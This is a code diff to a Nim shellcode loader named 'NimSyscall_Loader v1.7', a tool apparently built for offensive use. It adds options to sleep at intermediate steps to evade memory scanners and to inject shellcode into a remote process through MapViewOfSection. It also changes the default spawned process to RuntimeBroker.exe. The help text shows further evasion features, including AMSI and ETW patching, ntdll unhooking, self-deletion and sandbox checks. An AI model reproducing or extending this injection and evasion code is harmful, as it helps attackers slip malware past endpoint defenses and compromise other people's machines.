@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.7
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -107,7 +107,8 @@ Options:
 
 [evasion]
 
-  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
+  --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
+  --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --unhook    Unhook ntdll.dll before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
@@ -154,7 +155,8 @@ Options:
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
-  
+      --remoteMapSection    Map the shellcode into the remote process via MapViewOfSection -> decryption will happen AFTER writing the Shellcode into the remote process
+
 [PE Packing]
 
   --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
@@ -195,7 +197,7 @@ var
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
-    customspawnprocess: string = "notepad.exe"
+    customspawnprocess: string = "RuntimeBroker.exe"
     shellcodeFile: seq[string] = @["enc.blob"]
     scfile: string = ""
     retrieveFromFile: bool = false
@@ -224,6 +226,7 @@ var
     llvm: bool = false
     gosleep: bool = false
     sleeptime: int = 0
+    sleepinbetween: int = 0
     reflective: bool = false
     hide: bool = false
     apiHide: bool = false
@@ -254,6 +257,7 @@ var
     noDInvoke: bool = false
     noRES: bool = true
     antidebug: bool = false
+    remoteMapSection: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.7")
 
@@ -368,6 +372,9 @@ if args["--remotepatchAMSI"]:
 if args["--remotepatchETW"]:
   remoteETWpatch = true
 
+if args["--remoteMapSection"]:
+  remoteMapSection = true
+
 if args["--noAMSI"]:
   AMSI = false
 
@@ -396,6 +403,11 @@ if args["--sleep"]:
   sleeptime = (sleeptime)
   gosleep = true
 
+if args["--sleep-in-between"]:
+    sleepinbetween = parse_int($args["--sleep-in-between"])
+    sleepinbetween = (sleepinbetween)
+    gosleep = true
+    
 if args["--remoteinject"]:
   localinject = false
 
@@ -948,6 +960,10 @@ var dctx: ECB[aes256]
 """
 
 let Cryptstub2 = fmt"""
+
+when defined(sleepinbetween):
+    var sleepbetweentime: int = {sleepinbetween}
+
 var enctext: seq[byte] = toByteSeq(encstring)
 var key: array[aes256.sizeKey, byte]
 var envkey: string = obf("{envkey}")
@@ -1254,6 +1270,12 @@ tProcess.suspend() # That's handy!
 tProcess.close()
 
 when defined(verbose):
+    echo obf("[*] Sleeping in between for: "), {sleepinbetween}
+
+when defined(sleepinbetween):
+    HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
+
+when defined(verbose):
     echo obf("[*] Target Process: "), tProcess.processID
 var remoteProcID = DWORD(tProcess.processID)
 
@@ -1459,7 +1481,10 @@ if (peload):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
-            stub.add(ShellcoderemoteinjectStub)
+            if (remoteMapSection):
+                stub.add(ShellcodeRemoteInjectMapSection)
+            else:
+                stub.add(ShellcoderemoteinjectStub)
             stub.add(getRandStub())
             stub.add(getRandStub())
 
@@ -1560,8 +1585,10 @@ if (shellcode):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
-            
-        stub.add(ShellcoderemoteinjectStub)
+        if (remoteMapSection):
+            stub.add(ShellcodeRemoteInjectMapSection)
+        else:
+            stub.add(ShellcoderemoteinjectStub)
         stub.add(getRandStub())
 
 if (csharp):
@@ -1696,6 +1723,9 @@ if (wow64):
 
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
+
+if (sleepinbetween > 0):
+    basicCompileFlags.add(fmt"-d:sleepinbetween ")
 
 if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
